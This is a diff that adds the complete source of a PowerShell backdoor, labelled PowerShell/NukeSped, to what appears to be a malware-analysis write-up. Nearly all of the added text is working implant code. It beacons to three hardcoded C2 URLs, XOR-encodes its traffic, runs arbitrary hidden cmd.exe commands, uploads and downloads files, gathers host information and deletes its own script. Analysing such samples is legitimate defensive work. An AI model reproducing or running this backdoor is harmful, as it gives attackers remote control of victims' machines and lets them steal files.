@@ -123,7 +123,553 @@
 ### Powershell Backdoor (PowerShell/NukeSped)
 ###### Now, see the Windows version, this use Powershell language for the backdoor 
 
+``` powershell
+$global:breakvalue=1
+$global:mbz=132608
+$global:tid=0
+$global:url="https://crabbedly.club/board.php","https://craypot.live/board.php","https://indagator.club/board.php"
+$global:nup=0
+$global:nwct=0
 
+function CopyBytes($DatatoCopy,$dst,$dstOffset)
+{
+	$Bytes=[System.BitConverter]::GetBytes($DatatoCopy)
+	return [System.Buffer]::BlockCopy($Bytes,0,$dst,$dstOffset,$Bytes.length)
+}
+function CopyBytes_UTF8($DatatoCopy,$dst,$dstOffset)
+{
+	$Bytes=[System.Text.ASCIIEncoding]::UTF8.GetBytes($DatatoCopy)
+	return [System.Buffer]::BlockCopy($Bytes,0,$dst,$dstOffset,$Bytes.length)
+}
+function ConverttoInt32($buffer,$Offset){ return [System.BitConverter]::ToInt32($buffer,$Offset) }
+function Get_UTF8Bytes($Data){ return [System.Text.ASCIIEncoding]::UTF8.GetBytes($Data) }
+function senddata($tid,$rid,$array_data,$DatatoC2_Length,$url)
+{
+	try
+	{
+		if($array_data -eq $null){$array_data=New-Object byte[] 0}
+		$ID=-join((48..57)|Get-Random -Count 12|%{[char]$_}) #10 random numbers
+		$filename=-join((48..57)|Get-Random -Count 12|%{[char]$_})+".dat" # LIKE 5216804379.dat by example
+		$date_msg="--" + (Get-Date -Format yyyy-MM-dd-hh-mm-ss-fffffff) + "--"
+		$netobject=[System.Net.WebRequest]::create($url + "?v=" + $ID)
+		$netobject.Method="POST"
+		$netobject.ContentType="multipart/form-data; boundary=$date_msg"
+		$netobject.TimeOut=120000
+		$netobject.ReadWriteTimeout=120000
+		$netobject.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
+		$pbdy=Get_UTF8Bytes("`r`n`r`n--" + $date_msg + "`r`nContent-Disposition: form-data; name=`"_webident_f`"`r`n`r`n" + $tid + "`r`n--" + $date_msg + "`r`nContent-Disposition: form-data; name=`"_webident_s`"`r`n`r`n" + $rid + "`r`n--" + $date_msg + "`r`nContent-Disposition: form-data; name=`"file`"; filename=`"" + $filename + "`"`r`nContent-Type: octet-stream`r`n`r`n")
+		$ebdy=Get_UTF8Bytes("`r`n--" + $date_msg + "`r`n")
+		$netobject.ContentLength=$pbdy.Length + $DatatoC2_Length + $ebdy.Length;
+		$StreamObject=$netobject.GetRequestStream()
+		$StreamObject.Write($pbdy,0,$pbdy.Length)
+		$StreamObject.Flush()
+		if($DatatoC2_Length -gt 0)
+		{
+			$StreamObject.Write($array_data,0,$DatatoC2_Length)
+			$StreamObject.Flush()
+		}
+		$StreamObject.Write($ebdy,0,$ebdy.Length)
+		$StreamObject.Flush()
+		$StreamObject.Close()
+		return $netobject
+	}
+	catch{return $null}
+}
+function PushDatatoC2($tid,$rid,$bd,$DatatoC2_Length,$url)
+{
+	if($DatatoC2_Length -gt 0){ for($i=0;$i -lt $DatatoC2_Length; $i++){$bd[$i]=$bd[$i] -bxor 0xAA} }
+	return senddata $tid $rid $bd $DatatoC2_Length $url
+}
+function GetResponseC2($netobject,$mxz)
+{
+	try
+	{
+		$response=$netobject.GetResponse()
+		if($response.StatusCode -eq "OK")
+		{
+			$stream=$response.GetResponseStream()
+			$byteobject=New-Object byte[] $mxz
+			$val=0
+			$response_length=$byteobject.Length
+			if($response_length -gt $response.ContentLength){$response_length=$response.ContentLength}
+			while($val -lt $response_length)
+			{
+			$dataread=$stream.Read($byteobject,$val,$response_length-$val)
+			if($dataread -le 0){break}
+			$val=$val+$dataread
+			}
+			if($val -ne 0)
+			{
+				if($val -eq 1){$byteobject2=New-Object byte[] 2}
+				else
+				{
+					$byteobject2=New-Object byte[] $val}
+					[System.Buffer]::BlockCopy($byteobject,0,$byteobject2,0,$val)
+			}
+			else{$byteobject2=New-Object byte[] 2}
+			$response.Close()
+			$r.Close()
+			$r.Dispose()
+			return $byteobject2
+		}
+		else{return $null} 
+	}
+	catch{return $null}
+}
+function DecryptC2Data($netobject,$mxz)
+{
+	$DataC2=GetResponseC2 $netobject $mxz
+	if($DataC2 -ne $null){for($i=0; $i -lt $DataC2.length; $i++){ $DataC2[$i] = $DataC2[$i] -bxor 0xAA }}
+	return $DataC2
+}
+function updatemod1()
+{
+	$trigger=0
+	do
+	{
+		$byteobject=New-Object byte[] 12
+		CopyBytes 5 $byteobject 0
+		CopyBytes 0 $byteobject 4
+		CopyBytes 0 $byteobject 8
+		$response=PushDatatoC2 $global:tid 21 $byteobject $byteobject.Length $global:url[$global:nup]
+		if($response -eq $null){break}
+		$byteobject=DecryptC2Data $response $global:mbz
+		if(($byteobject -eq $null) -or ($byteobject.length -ne 2)){break}
+		$trigger=1
+	}while($false)
+	return $trigger
+}
+function updatemod2()
+{
+	$trigger=0
+	do
+	{
+
+		$byteobject=New-Object byte[] 16
+		CopyBytes 4 $byteobject 0
+		CopyBytes 0 $byteobject 4
+		CopyBytes 4 $byteobject 8
+		CopyBytes 0 $byteobject 12
+		$rq=PushDatatoC2 $global:tid 21 $byteobject $byteobject.Length $global:url[$global:nup]
+		if($rq -eq $null){break}
+		$byteobject=DecryptC2Data $rq $global:mbz
+		if(($byteobject -eq $null) -or ($byteobject.length -ne 2)){break}
+		$trigger=1
+	} while($false)
+	return $trigger
+}
+function updatemod3($nmsg)
+{
+	$trigger=0
+	do
+	{
+
+		$byteobject=New-Object byte[] 12
+		CopyBytes $nmsg $byteobject 0
+		CopyBytes 0 $byteobject 4
+		CopyBytes 0 $byteobject 8
+		$rq=PushDatatoC2 $global:tid 20 $byteobject $byteobject.Length $global:url[$global:nup]
+		if($rq -eq $null){break}
+		$byteobject=DecryptC2Data $rq $global:mbz
+		if(($byteobject -eq $null) -or ($byteobject.length -lt 12)){break}
+		$nmsg=ConverttoInt32 $byteobject 0
+		$nmlen=ConverttoInt32 $byteobject 8
+		if($byteobject.length -ne ($nmlen+12)){break}
+		if(($nmlen -ne 0) -or ($nmsg -ne 5)){break}
+		$trigger=1
+	} while($false)
+	return $trigger
+}
+function slp($buf)
+{
+	$trigger=0
+	do
+	{
+		$nmlen=ConverttoInt32 $buf 8
+		if($nmlen -ne 4){break}
+		$global:nwct=ConverttoInt32 $buf 12
+		$trigger=updatemod1
+		$trigger=0
+	} while($false)
+	return $trigger
+}
+function disconnect()
+{
+	$trigger=0
+	do
+	{
+		$trigger=updatemod1
+		if($trigger -eq 0){break}
+		$trigger=1
+		$global:breakvalue=0
+	} while($false)
+	return $trigger
+}
+function Set-SysInfo()
+{
+	$trigger=0
+	do
+	{
+		$hostnamename=$env:COMPUTERNAME
+		$ip=(Test-Connection -ComputerName $hostname -Count 1  | Select -ExpandProperty IPV4Address).Address
+		$OS=[System.Environment]::OSVersion.Version
+		$OS_major=$OS.major
+		$OS_minor=$OS.minor
+		$byteobject=New-Object byte[] 300
+		CopyBytes 11 $byteobject 0
+		CopyBytes 0 $byteobject 4
+		CopyBytes 288 $byteobject 8
+		CopyBytes_UTF8 $hostname $byteobject 12
+		CopyBytes $ip $byteobject 272
+		CopyBytes 1 $byteobject 276
+		CopyBytes $OS_major $byteobject 280
+		CopyBytes $OS_minor $byteobject 284
+		CopyBytes 3 $byteobject 288
+		CopyBytes 0 $byteobject 292
+		CopyBytes 6 $byteobject 296
+		$rq=PushDatatoC2 $global:tid 20 $byteobject $byteobject.Length $global:url[$global:nup]
+		if($rq -eq $null){break}
+		$byteobject=DecryptC2Data $rq $global:mbz
+		if(($byteobject -eq $null) -or ($byteobject.length -lt 12)){break}
+		$nmsg=ConverttoInt32 $byteobject 0
+		$nmlen=ConverttoInt32 $byteobject 8
+		if($byteobject.length -ne ($nmlen+12)){break}
+		if(($nmlen -ne 0) -or ($nmsg -ne 5)){break}
+		$trigger=1
+	} while($false)
+	return $trigger
+}
+function kalv()
+{
+	$trigger=0
+	do
+	{
+		$trigger=updatemod1
+		if($trigger -eq 0){break}
+		$trigger=1
+	} while($false)
+	return $trigger
+}
+function Get-actions()
+{
+	$trigger=0
+	do
+	{
+		$nmsg=14
+		$nrsv=0
+		$nmlen=2152
+		$basefunctions=New-Object byte[] 2164
+		CopyBytes $nmsg $basefunctions 0
+		CopyBytes $nrsv $basefunctions 4
+		CopyBytes $nmlen $basefunctions 8
+		for($i=0;$i -lt $global:url.length;$i++){CopyBytes_UTF8 $global:url[$i] $basefunctions (84+260*$i)}
+		$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
+		if($rq -eq $null){break}
+		$basefunctions=DecryptC2Data $rq $global:mbz
+		if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){break}
+		$nmsg=ConverttoInt32 $basefunctions 0
+		$nmlen=ConverttoInt32 $basefunctions 8
+		if($basefunctions.length -ne ($nmlen+12)){break}
+		if(($nmlen -ne 0) -or ($nmsg -ne 5)){break}
+		$trigger=1
+	} while($false)
+	return $trigger
+}
+function Set-actions($buf)
+{
+	$trigger=0
+	do
+	{
+		$nmlen=ConverttoInt32 $buf 8
+		if($nmlen -ne 2152){break}
+		for($i=0;$i -lt $global:url.length;$i++)
+		{
+			$js=0
+			for($js=0;$js -lt 260;$js++){if($buf[(84+260*$i)+$js] -eq 0){break}}
+			$global:url[$i] = [System.Text.ASCIIEncoding]::UTF8.GetString($buf, (84+260*$i), $js)
+		}
+		$trigger=updatemod1
+		if($trigger -eq 0){break}
+		$trigger=1
+	} while($false)
+	return $trigger
+}
+function Set-command($buf)
+{
+	$trigger=0
+	do
+	{
+		$nmlen=ConverttoInt32 $buf 8
+		$arg=[System.Text.ASCIIEncoding]::UTF8.GetString($buf,12,$nmlen)
+		$path=[System.IO.Path]::GetTempFileName()
+		$process = New-Object System.Diagnostics.Process
+		$pif = New-Object System.Diagnostics.ProcessStartInfo
+		$pif.FileName="cmd.exe"
+		$pif.CreateNoWindow=$true;
+		$pif.WindowStyle="Hidden";
+		$pif.Arguments="/c "+$arg+" >"+$path+" 2>&1"
+		$process.StartInfo=$pif
+		$process.Start() | Out-Null
+		$srs=""
+		$count=0
+	while ($process.HasExited -eq $false)
+	{
+		if($count -gt 24){break}
+		$count=$count+1
+		Start-Sleep -s 1
+	}
+	if([System.IO.File]::Exists($path))
+	{
+		try
+		{
+            $content=Get-Content -Path $path; 
+            Remove-Item -Path $path;
+			if($content.GetType().FullName -eq "System.Object[]")
+			{
+				for($i=0;$i -lt $content.Length; $i++){$srs=$srs+$content[$i]+"`r`n"}
+			}
+			else{$srs=$content}
+		}
+		catch{$srs=""}
+	}
+	$srsb=Get_UTF8Bytes($srs)
+	$trigger= updatemod3 5
+	if($trigger -eq 0){break}
+	$srsb=Get_UTF8Bytes($srs)
+	$ncr=0
+	$trigger=1
+	while($ncr -lt $srsb.length)
+	{
+		$ncrs=1024*100
+		if($ncrs -gt ($srsb.length-$ncr)){$ncrs=($srsb.length-$ncr)}
+		$nmlen=$ncrs
+		$basefunctions=New-Object byte[] (12+$ncrs)
+		CopyBytes 16 $basefunctions 0
+		CopyBytes 0 $basefunctions 4
+		CopyBytes $nmlen $basefunctions 8
+		for($i=0;$i -lt $ncrs;$i++){$basefunctions[12+$i]=$srsb[$ncr+$i]}
+		$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
+		if($rq -eq $null){$trigger=0;break}
+		$basefunctions=DecryptC2Data $rq $global:mbz
+		if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){$trigger=0;break}
+		$nmsg=ConverttoInt32 $basefunctions 0
+		$nmlen=ConverttoInt32 $basefunctions 8
+		if($basefunctions.length -ne ($nmlen+12)){$trigger=0;break}
+		if(($nmlen -ne 0) -or ($nmsg -ne 5)){$trigger=0;break}
+		$ncr=$ncr+$ncrs
+		}
+		if($trigger -eq 0){break}
+		$trigger=updatemod3 17
+		if($trigger -eq 0){break}
+		$trigger=1
+	}while($false)
+	return $trigger
+}
+function upload($buf)
+{
+	$trigger=0
+	do
+	{
+		$nmlen=ConverttoInt32 $buf 8
+		$path=[System.Text.ASCIIEncoding]::UTF8.GetString($buf,12,$nmlen)
+		$fs=$null
+		try{$fs=[System.IO.File]::Open($path, [System.IO.FileMode]::Append)}catch{$fs=$null}
+		if($fs -eq $null){$trigger=updatemod2;}
+		else
+		{
+			try
+			{
+				$fl=[int]$fs.length
+				$nmsg=5
+				$nrsv=0
+				$nmlen=4
+				$basefunctions=New-Object byte[] 16
+				CopyBytes $nmsg $basefunctions 0
+				CopyBytes $nrsv $basefunctions 4
+				CopyBytes $nmlen $basefunctions 8
+				CopyBytes $fl $basefunctions 12
+				$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
+				if($rq -eq $null){break}
+				$basefunctions=DecryptC2Data $rq $global:mbz
+				if(($basefunctions -eq $null) -or ($basefunctions.length -lt 24)){break}
+				$nmsg=ConverttoInt32 $basefunctions 0
+				$nmlen=ConverttoInt32 $basefunctions 8
+				$rfl=ConverttoInt32 $basefunctions 12
+				if($basefunctions.length -ne ($nmlen+12)){break}
+				if(($nmlen -ne 12) -or ($nmsg -ne 5)){break}
+				$trigger=updatemod1
+				if($trigger -eq 0){break}
+				$bed=0
+				while($true)
+				{
+					$rq=PushDatatoC2 $global:tid 22 $null 0 $global:url[$global:nup]
+					if($rq -eq $null){$trigger=0;break}
+					$basefunctions=DecryptC2Data $rq $global:mbz
+					if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){$trigger=0;break}
+					$nmsg=ConverttoInt32 $basefunctions 0
+					$nmlen=ConverttoInt32 $basefunctions 8
+					if($basefunctions.length -ne ($nmlen+12)){$trigger=0;break}
+					$fs.Write($basefunctions,12,$nmlen)
+					if($nmsg -eq 17){$bed=1}
+					$trigger=updatemod1
+					if($trigger -eq 0){break}
+					if($bed -eq 1){break}
+				}
+				$fs.Close()
+				if($trigger -eq 0){break}
+			}
+			catch{$fs.Close();break}
+		}
+		$trigger=1
+	} while($false)
+	return $trigger
+}
+function download($buf)
+{
+	$trigger=0
+	do
+	{
+		$nmlen=ConverttoInt32 $buf 8
+		$path=[System.Text.ASCIIEncoding]::UTF8.GetString($buf,12,$nmlen)
+		$fs=$null
+		try{$fs=[System.IO.File]::OpenRead($path)}catch{$fs=$null}
+		if($fs -eq $null){$trigger=updatemod2;}
+	else
+	{
+		try
+		{
+			$fl=$fs.length
+			$basefunctions=New-Object byte[] 24
+			CopyBytes 5 $basefunctions 0
+			CopyBytes 0 $basefunctions 4
+			CopyBytes 12 $basefunctions 8
+			CopyBytes $fl $basefunctions 12
+			CopyBytes 0 $basefunctions 16
+			CopyBytes 0 $basefunctions 20
+			$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
+			if($rq -eq $null){break}
+			$basefunctions=DecryptC2Data $rq $global:mbz
+			if(($basefunctions -eq $null) -or ($basefunctions.length -lt 16)){break}
+			$nmsg=ConverttoInt32 $basefunctions 0
+			$nmlen=ConverttoInt32 $basefunctions 8
+			$rfl=ConverttoInt32 $basefunctions 12
+			if($basefunctions.length -ne ($nmlen+12)){break}
+			if(($nmlen -ne 4) -or ($nmsg -ne 5)){break}
+			$trigger=1
+			if($rfl -gt $fl){$rfl=$fl}
+			$fs.Seek($rfl, [System.IO.SeekOrigin]::Begin)
+			while($true)
+			{
+				$ncrs=1024*100
+				$tbf=New-Object byte[] $ncrs
+				$nr=$fs.Read($tbf, 0, $tbf.Length)
+				if($nr -eq 0){break}
+				$nmsg=16
+				$nrsv=0
+				$nmlen=$nr
+				$basefunctions=New-Object byte[] (12+$nr)
+				CopyBytes $nmsg $basefunctions 0
+				CopyBytes $nrsv $basefunctions 4
+				CopyBytes $nmlen $basefunctions 8
+				for($i=0;$i -lt $nr;$i++){$basefunctions[12+$i]=$tbf[$i]}
+				$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
+				if($rq -eq $null){$trigger=0;break}
+				$basefunctions=DecryptC2Data $rq $global:mbz
+				if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){$trigger=0;break}
+				$nmsg=ConverttoInt32 $basefunctions 0
+				$nmlen=ConverttoInt32 $basefunctions 8
+				if($basefunctions.length -ne ($nmlen+12)){$trigger=0;break}
+				if(($nmlen -ne 0) -or ($nmsg -ne 5)){$trigger=0;break}
+			}
+			$fs.close()
+			if($trigger -eq 0){break}
+			$trigger=updatemod3 17
+			if($trigger -eq 0){break}
+		}
+		catch{$fs.Close();break}
+	}
+	$trigger=1
+	} while($false)
+	return $trigger
+}
+function launch_process($buf)
+{
+	$trigger=0
+	do
+	{
+		$nmlen=ConverttoInt32 $buf 8
+		$arg=[System.Text.ASCIIEncoding]::UTF8.GetString($buf,12,$nmlen)
+		Start-Process $arg
+		$trigger=updatemod1
+		if($trigger -eq 0){break}
+		$trigger=1
+	} while($false)
+	return $trigger
+}
+function PulsetoC2($rid)
+{
+	$trigger=$false
+	if($rid -eq 16){$global:nup=($global:nup + 1) % $global:url.Length}
+	$rq=senddata $global:tid $rid $null 0 $global:url[$global:nup]
+	if($rq -ne $null)
+	{
+		$basefunctions=GetResponseC2 $rq $global:mbz
+		if(($basefunctions.length -eq 2) -and ($basefunctions[0] -eq 49)){$trigger=$true}
+	}
+	return $trigger
+}
+function command($url)
+{
+	try
+	{
+		while($global:breakvalue)
+		{
+			$rq=PushDatatoC2 $global:tid 22 $null 0 $global:url[$global:nup]
+			if($rq -eq $null){break}
+			$basefunctions=DecryptC2Data $rq $global:mbz
+			if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){break}
+			$nmsg=ConverttoInt32 $basefunctions 0
+			$nmlen=ConverttoInt32 $basefunctions 8
+			if($basefunctions.length -ne ($nmlen+12)){break}
+			$cres=0
+			if($nmsg -eq 2){$cres=slp $basefunctions}
+			elseif($nmsg -eq 3){$cres=diconnect}
+			elseif($nmsg -eq 11){$cres=Set-SysInfo}
+			elseif($nmsg -eq 12){$cres=kalv}
+			elseif($nmsg -eq 14){$cres=Get-actions}
+			elseif($nmsg -eq 15){$cres=Set-contentaction $basefunctions}
+			elseif($nmsg -eq 18){$cres=Set-command $basefunctions}
+			elseif($nmsg -eq 20){$cres=upload $basefunctions}
+			elseif($nmsg -eq 21){$cres=download $basefunctions}
+			elseif($nmsg -eq 24){$cres=launch_process $basefunctions}
+			else{break}
+			if($cres -eq 0){break}
+			Start-Sleep -s 1
+		}
+		Start-Sleep -s 4
+		if(PulsetoC2(17) -eq $true){}
+	}
+	catch{}
+}
+function main()
+{
+	$global:tid=Get-Random -Minimum 128 -Maximum 16383
+	while($global:breakvalue)
+	{
+		Try
+		{
+			if($global:nwct -gt 0){$global:nwct=$global:nwct- 1}
+			if($global:nwct -le 0){ if (PulsetoC2(16) -eq $true){Start-Sleep -s 4; command($global:url[$global:nup])} }
+		}
+		Catch{}
+		if($global:breakvalue -ne 1){break}
+		Start-Sleep -s 60
+	}
+}
+try{Remove-Item -Path $MyInvocation.MyCommand.Source}catch{}
+main
+
+```
 
 ## Cyber kill chain <a name="Cyber-kill-chain"></a>
 ###### The process graphs resume all the cyber kill chains used by the attacker. 
